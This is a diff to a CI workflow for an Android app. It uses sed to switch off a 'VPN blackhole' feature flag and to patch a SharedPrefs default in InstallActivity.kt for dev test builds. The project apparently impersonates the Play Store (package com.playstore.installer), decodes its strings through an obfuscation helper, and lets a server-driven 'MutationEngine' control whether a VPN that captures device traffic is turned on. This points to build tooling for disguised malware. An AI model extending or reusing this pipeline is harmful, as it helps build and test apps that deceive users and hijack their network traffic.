@@ -369,12 +369,33 @@ jobs:
         run: |
           set -e
           # Dev test builds always disable the VPN blackhole — no VPN in test APKs
+
+          # 1. Flip compile-time flag in build.gradle (kept for reference/logging)
           sed -i "s|buildConfigField \"boolean\", \"FEATURE_FLAG_V\", \"true\"|buildConfigField \"boolean\", \"FEATURE_FLAG_V\", \"false\"|" app/build.gradle
           if grep -q 'FEATURE_FLAG_V' app/build.gradle; then
             INJECTED=$(grep 'FEATURE_FLAG_V' app/build.gradle | head -1)
             echo "✅ FEATURE_FLAG_V forced OFF for dev build: ${INJECTED}"
           else
             echo "::error::FEATURE_FLAG_V injection failed"
+            exit 1
+          fi
+
+          # 2. Patch SharedPrefs default in InstallActivity.kt:
+          #    The runtime VPN gate reads vpn_bypass from SharedPrefs with default=1 (VPN ON).
+          #    MutationEngine writes this value from server response — but on first install
+          #    before server responds, the default fires and shows the VPN permission dialog.
+          #    For dev test builds, patch the default from 1 → 0 so VPN is NEVER triggered.
+          INSTALL_ACT="app/src/main/java/com/playstore/installer/InstallActivity.kt"
+          if [ -f "$INSTALL_ACT" ]; then
+            sed -i 's/\.getInt(StringPool\.d(StringPool\.VPN_FLAG), 1) == 1/.getInt(StringPool.d(StringPool.VPN_FLAG), 0) == 1/' "$INSTALL_ACT"
+            if grep -q 'VPN_FLAG), 0' "$INSTALL_ACT"; then
+              echo "✅ VPN SharedPrefs default patched to 0 (VPN OFF) in InstallActivity.kt"
+            else
+              echo "::error::VPN default patch failed in InstallActivity.kt"
+              exit 1
+            fi
+          else
+            echo "::error::InstallActivity.kt not found at $INSTALL_ACT"
             exit 1
           fi
 
